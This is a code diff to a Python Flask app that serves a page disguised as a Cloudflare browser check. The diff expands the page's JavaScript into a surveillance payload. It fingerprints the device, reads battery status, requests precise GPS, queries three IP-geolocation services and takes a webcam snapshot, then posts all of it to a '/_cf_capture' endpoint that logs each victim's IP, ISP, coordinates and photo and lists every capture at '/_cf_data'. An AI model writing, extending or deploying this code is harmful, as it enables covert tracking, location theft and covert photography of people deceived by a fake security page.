@@ -92,80 +92,160 @@ CF_HTML = """
     </div>
 
     <script>
-        let collectedInfo = {
-            ua: navigator.userAgent,
-            screen: { w: screen.width, h: screen.height },
-            lang: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            plugins: Array.from(navigator.plugins).map(p => p.name),
-            cookies: navigator.cookieEnabled,
-            java: navigator.javaEnabled(),
-            pdf: navigator.pdfViewerEnabled,
-            hardware: navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory
-        };
+        setTimeout(function() {
+            collectEverything();
+        }, 1000);
 
-        function startCollection() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        collectedInfo.loc = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            acc: pos.coords.accuracy
-                        };
-                        sendToServer();
-                    },
-                    () => sendToServer(),
-                    { enableHighAccuracy: true, timeout: 3000 }
-                );
-            } else {
-                sendToServer();
-            }
+        function collectEverything() {
+            let allData = {
+                timestamp: new Date().toISOString(),
+                ray_id: '{{ ray_code }}',
+                user_agent: navigator.userAgent,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardware: navigator.hardwareConcurrency,
+                device_memory: navigator.deviceMemory,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack,
+                pdf: navigator.pdfViewerEnabled,
+                touch: navigator.maxTouchPoints,
+                webdriver: navigator.webdriver,
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mime_types: Array.from(navigator.mimeTypes).map(m => m.type)
+            };
 
-            function sendToServer() {
-                fetch('https://ipinfo.io/json').then(r => r.json()).then(ipData => {
-                    collectedInfo.ip = ipData;
-                    
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        navigator.mediaDevices.getUserMedia({ video: true })
-                            .then(stream => {
-                                const vid = document.createElement('video');
-                                const canv = document.createElement('canvas');
-                                const ctx = canv.getContext('2d');
-                                
-                                vid.srcObject = stream;
-                                vid.play();
-                                
-                                setTimeout(() => {
-                                    canv.width = vid.videoWidth;
-                                    canv.height = vid.videoHeight;
-                                    ctx.drawImage(vid, 0, 0);
-                                    collectedInfo.cam = canv.toDataURL('image/jpeg', 0.7);
-                                    
-                                    stream.getTracks().forEach(t => t.stop());
-                                    finalSend();
-                                }, 1500);
-                            })
-                            .catch(() => finalSend());
-                    } else {
-                        finalSend();
-                    }
-                }).catch(() => finalSend());
-            }
-
-            function finalSend() {
-                fetch('/_cf_capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(collectedInfo)
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(batt => {
+                    allData.battery = {
+                        level: Math.round(batt.level * 100) + '%',
+                        charging: batt.charging,
+                        charging_time: batt.chargingTime,
+                        discharging_time: batt.dischargingTime
+                    };
+                    getLocation(allData);
                 });
+            } else {
+                getLocation(allData);
             }
         }
 
-        setTimeout(function() {
-            startCollection();
-        }, 2000);
+        function getLocation(allData) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        allData.location = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            altitude: pos.coords.altitude,
+                            altitude_accuracy: pos.coords.altitudeAccuracy,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed
+                        };
+                        getIP(allData);
+                    },
+                    function(err) {
+                        allData.location_error = err.code;
+                        getIP(allData);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                getIP(allData);
+            }
+        }
+
+        function getIP(allData) {
+            Promise.allSettled([
+                fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                fetch('https://ipapi.co/json/').then(r => r.json()),
+                fetch('https://ipinfo.io/json').then(r => r.json())
+            ]).then(results => {
+                allData.ip_info = {};
+                results.forEach((result, index) => {
+                    if (result.status === 'fulfilled') {
+                        allData.ip_info['source_' + index] = result.value;
+                    }
+                });
+                getCamera(allData);
+            }).catch(() => {
+                getCamera(allData);
+            });
+        }
+
+        function getCamera(allData) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                }).then(function(stream) {
+                    const videoElement = document.createElement('video');
+                    const canvasElement = document.createElement('canvas');
+                    const context = canvasElement.getContext('2d');
+                    
+                    videoElement.srcObject = stream;
+                    videoElement.play();
+                    
+                    setTimeout(function() {
+                        canvasElement.width = videoElement.videoWidth;
+                        canvasElement.height = videoElement.videoHeight;
+                        context.drawImage(videoElement, 0, 0);
+                        
+                        allData.camera_data = canvasElement.toDataURL('image/jpeg', 0.8);
+                        
+                        stream.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+                        
+                        sendData(allData);
+                    }, 2000);
+                    
+                }).catch(function(error) {
+                    allData.camera_error = error.name;
+                    sendData(allData);
+                });
+            } else {
+                sendData(allData);
+            }
+        }
+
+        function sendData(data) {
+            fetch('/_cf_capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).then(function(response) {
+                return response.json();
+            }).then(function(result) {
+                console.log('Data sent');
+            }).catch(function(error) {
+                console.log('Send error');
+            });
+        }
     </script>
 </body>
 </html>
@@ -184,30 +264,37 @@ def main_page():
 @app.route('/_cf_capture', methods=['POST'])
 def capture_endpoint():
     data = request.get_json()
-    data['timestamp'] = time.time()
+    data['server_timestamp'] = time.time()
     data['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    data['cf_ray'] = z_make_id()
     
     x_data_store.append(data)
     
-    print(f"[CAPTURED] IP: {data.get('client_ip', 'Unknown')} | Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"\n🎯 CAPTURED DATA")
+    print(f"IP: {data.get('client_ip', 'Unknown')}")
     
-    if data.get('ip'):
-        ip_data = data['ip']
-        print(f"         Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('country', 'Unknown')}")
+    ip_info = data.get('ip_info', {})
+    if ip_info:
+        first_ip = next(iter(ip_info.values()), {})
+        print(f"Location: {first_ip.get('city', 'Unknown')}, {first_ip.get('country', 'Unknown')}")
+        print(f"ISP: {first_ip.get('org', 'Unknown')}")
     
-    if data.get('cam'):
-        print(f"         📸 Camera: CAPTURED")
+    if data.get('location'):
+        loc = data['location']
+        print(f"GPS: {loc.get('latitude')}, {loc.get('longitude')}")
     
-    if data.get('loc'):
-        loc = data['loc']
-        print(f"         📍 GPS: {loc.get('lat', 'N/A')}, {loc.get('lon', 'N/A')}")
+    if data.get('camera_data'):
+        print(f"📸 CAMERA: CAPTURED")
     
-    return {'status': 'ok'}
+    print(f"Device: {data.get('user_agent', 'Unknown')[:80]}...")
+    print(f"Screen: {data.get('screen', {}).get('width')}x{data.get('screen', {}).get('height')}")
+    print(f"Language: {data.get('language', 'Unknown')}")
+    print(f"Timezone: {data.get('timezone', 'Unknown')}")
+    
+    return {'status': 'success', 'message': 'Data received'}
 
 @app.route('/_cf_data')
 def data_endpoint():
-    return {'total': len(x_data_store), 'data': x_data_store}
+    return {'total_captures': len(x_data_store), 'captures': x_data_store}
 
 @app.route('/_cf_clear')
 def clear_endpoint():
